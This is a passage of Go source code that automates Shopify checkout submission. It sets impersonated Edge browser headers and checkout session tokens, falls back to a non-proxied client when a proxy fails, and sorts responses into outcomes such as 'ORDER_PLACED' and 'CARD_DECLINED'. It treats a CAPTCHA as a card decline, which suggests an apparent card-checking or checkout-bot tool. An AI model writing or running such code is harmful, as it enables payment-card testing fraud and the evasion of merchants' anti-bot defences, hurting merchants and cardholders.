	req.Header.Set("shopify-checkout-source", fmt.Sprintf(`id="%s", type="cn"`, checkoutToken))
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")
	req.Header.Set("x-checkout-one-session-token", sessionToken)
	req.Header.Set("x-checkout-web-build-id", buildID)
	req.Header.Set("x-checkout-web-deploy-stage", "production")
	req.Header.Set("x-checkout-web-server-handling", "fast")
	req.Header.Set("x-checkout-web-server-rendering", "yes")
	req.Header.Set("x-checkout-web-source-id", sourceToken)

	resp, err := doWithRetry(client, req, 2)
	if err != nil && proxyURL != "" {
		if req.GetBody != nil {
			if rb, gbErr := req.GetBody(); gbErr == nil {
				req.Body = rb
			}
		}
		fallbackClient, fbErr := createNoProxyClient()
		if fbErr == nil {
			resp, err = doWithRetry(fallbackClient, req, 2)
		}
	}
	if err != nil {
		return 0, "", fmt.Errorf("POST SubmitForCompletion: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", fmt.Errorf("reading response: %w", err)
	}

	return resp.StatusCode, string(body), nil
}

func checkProposalErrors(step string, status int, body string) {
	if status != 200 {
		fmt.Printf("  âš  %s: HTTP %d (expected 200)\n", step, status)
	}
	matches := proposalErrorRe.FindAllStringSubmatch(body, -1)
	if len(matches) == 0 {
		fmt.Printf("  âœ… %s: No errors\n", step)
		return
	}
	fmt.Printf("  âš  %s: %d error(s):\n", step, len(matches))
	for i, m := range matches {
		code := m[1]
		msg := m[2]
		if msg != "" {
			fmt.Printf("    [%d] %s â€” %s\n", i+1, code, msg)
		} else {
			fmt.Printf("    [%d] %s\n", i+1, code)
		}
	}
}

func checkSubmitErrors(status int, body string) {
	if status != 200 {
		fmt.Printf("  âš  SubmitForCompletion: HTTP %d (expected 200)\n", status)
	}
	if m := submitTypeRe.FindStringSubmatch(body); len(m) > 1 {
		fmt.Printf("  Result: %s\n", m[1])
		if m[1] != "SubmitSuccess" {
			matches := proposalErrorRe.FindAllStringSubmatch(body, -1)
			for i, em := range matches {
				fmt.Printf("    [%d] %s â€” %s\n", i+1, em[1], em[2])
			}
		}
	}
}

func saveDebugResponse(name, body string) {
}

func extractReceiptStatusCode(pollBody, receiptType string) string {
	if receiptType == "SuccessfulReceipt" || receiptType == "ProcessedReceipt" {
		return "ORDER_PLACED"
	}
	if receiptType == "ProcessingReceipt" {
		return "PROCESSING"
	}

	codeRe := regexp.MustCompile(`"code"\s*:\s*"([^"]+)"`)
	if m := codeRe.FindStringSubmatch(pollBody); len(m) > 1 {
		return m[1]
	}

	if strings.Contains(pollBody, "CAPTCHA") {
		return "CARD_DECLINED"
	}

	if receiptType == "FailedReceipt" {
		return "FAILED"
	}

	return "UNKNOWN"
}
